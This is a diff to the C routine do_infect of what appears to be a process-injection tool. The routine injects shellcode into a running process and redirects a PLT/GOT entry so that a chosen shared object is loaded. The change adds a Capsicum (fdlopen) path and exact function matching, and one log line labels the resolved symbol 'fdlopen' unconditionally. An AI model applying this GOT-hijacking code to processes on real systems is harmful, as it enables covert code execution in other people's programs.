@@ -44,7 +44,8 @@
 #include "infect.h"
 
 void
-do_infect(pid_t pid, char *inject, char *so, char *targetfunc)
+do_infect(pid_t pid, int capsicum, char *inject, char *so,
+    char *targetfunc)
 {
 	unsigned long addr, mapping, pltgot_addr;
 	unsigned long dlopen_addr, dlsym_addr;
@@ -53,7 +54,10 @@ do_infect(pid_t pid, char *inject, char *so, char *targetfunc)
 	void *map, *p1;
 	RTLD_SYM *sym;
 	HIJACK *ctx;
+	char *dl;
 	int fd;
+
+	dl = capsicum ? "fdlopen" : "dlopen";
 
 	ctx = InitHijack(F_DEFAULT /* | F_DEBUG | F_DEBUG_VERBOSE*/);
 	if (ctx == NULL) {
@@ -100,6 +104,13 @@ do_infect(pid_t pid, char *inject, char *so, char *targetfunc)
 		if (!(func->name))
 			continue;
 
+		/*
+		 * FindAllFunctionsByName returns a fuzzy match.
+		 * Narrow it down further with strcmp here.
+		 */
+		if (strcmp(targetfunc, func->name))
+			continue;
+
 		pltgot_addr = FindFunctionInGot(ctx, ctx->pltgot,
 		    func->vaddr);
 		if (pltgot_addr > 0)
@@ -115,9 +126,9 @@ do_infect(pid_t pid, char *inject, char *so, char *targetfunc)
 		return;
 	}
 
-	sym = resolv_rtld_sym(ctx, "dlopen");
+	sym = resolv_rtld_sym(ctx, dl);
 	if (sym == NULL) {
-		fprintf(stderr, "[-] Could not resolve dlopen\n");
+		fprintf(stderr, "[-] Could not resolve %s\n", dl);
 		Detach(ctx);
 		munmap(map, sb.st_size);
 		close(fd);
@@ -210,8 +221,10 @@ do_infect(pid_t pid, char *inject, char *so, char *targetfunc)
 	}
 	memmove(p1, &pltgot_addr, 8);
 	fprintf(stderr, "[+] shellcode injected at 0x%016lx\n", addr);
-	fprintf(stderr, "[+] dlopen is at 0x%016lx\n", dlopen_addr);
+	fprintf(stderr, "[+] fdlopen is at 0x%016lx\n", dlopen_addr);
 	fprintf(stderr, "[+] dlsym is at 0x%016lx\n", dlsym_addr);
+	fprintf(stderr, "[+] pltgot is at 0x%016lx\n",
+	    (unsigned long)pltgot_addr);
 
 	InjectShellcodeFromMemoryAndRun(ctx, addr, map,
 	    sb.st_size, true);
